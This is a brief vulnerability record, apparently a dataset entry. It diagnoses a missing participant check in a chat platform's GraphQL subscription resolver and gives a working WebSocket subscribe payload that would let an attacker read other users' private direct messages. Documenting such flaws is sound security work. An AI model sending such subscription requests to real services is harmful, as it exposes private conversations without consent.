diagnosis: The subscription resolver listens to the topic for conversationId without checking if context.user.id is a participant in that conversation. An attacker can eavesdrop on private one-on-one message exchanges between other users by subscribing to target conversation IDs.
exploit_request:
POST /graphql HTTP/1.1
Host: chat.platform.com
Upgrade: websocket
Sec-WebSocket-Protocol: graphql-transport-ws

{"type": "subscribe", "id": "leak_chat", "payload": {"query": "subscription { directMessageReceived(conversationId: \"conv_sec_99182\") { id text senderId createdAt } }"}}
